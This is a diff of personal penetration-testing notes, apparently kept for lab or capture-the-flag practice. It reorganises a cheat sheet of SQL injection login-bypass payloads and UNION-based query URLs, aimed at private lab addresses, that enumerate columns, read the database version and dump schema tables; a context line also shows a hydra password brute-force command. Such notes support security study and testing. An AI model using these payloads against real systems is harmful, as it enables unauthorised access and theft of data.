@@ -590,31 +590,53 @@ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k
 	     
 7.3.	      SQL Injection     #Examine how the server behaves
 
-POST Method -->
 
 
-Get Method --> via the url
-http://172.20.29.77/login.php?username=tom' OR 1='1 & passwd=tom ' or 1='1
 
 
-' or '1'='1
-' or 1=1-- -
-' or 1=1 --	    
-a' or 1=1 --	
-" or 1=1 --	  
-a" or 1=1 --	      
-' or 1=1 #	      
-" or 1=1 #	     
-or 1=1 --	   
-and 1=1 
-‘ or 'x'='x	  
-" or "x"="x	  
-') or ('x'='x	
-") or ("x"="x	      
-' or username LIKE '%admin% 
 
-Identify how many columns
-	union select 1,2,3 ;#
+
+Example 1a.  Identify injectable area. Verify output.
+	Inject following via authorized input section POST Method
+		' or '1'='1
+		' or 1=1-- -
+		' or 1=1 --	    
+		a' or 1=1 --	
+		" or 1=1 --	  
+		a" or 1=1 --	      
+		' or 1=1 #	      
+		" or 1=1 #	     
+		or 1=1 --	   
+		and 1=1 
+		‘ or 'x'='x	  
+		" or "x"="x	  
+		') or ('x'='x	
+		") or ("x"="x	      
+		' or username LIKE '%admin% 
+		admin=
+
+	Inject following via url   Get Method
+		http://172.20.29.77/login.php?username=tom' OR 1='1 & passwd=tom ' or 1='1	
+		
+		
+
+Example 1b. Identify vulnerable columns. 
+	union select 1,2,3,4,5... 
+	http://10.10.10.31/singlepost.php?id=12 union select 1,2,3,4,5
+	
+	
+Exaple 2. Identify the webpage I have total control
+	change id,page, or whatever fixed number, and verify output. 
+	http://10.10.10.31/singlepost.php?id=12 union select 1,2,3,4,5
+	
+Example 3. Identify version info
+	union select 1,2,3,4,version()
+	http://10.10.10.31/singlepost.php?id=12 union select 1,2,3,4,version()
+	
+Example 4. Understand system behavior. How many outputs the query have? Which value goes where?
+	
+	a@b.com'  uniOn select 1,2,3, 'a@b.com'-- -
+	
 
 Golen statement
 	 http://172.20.22.134/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns union select table_schema,column_name,table_name from information_schema.columns 
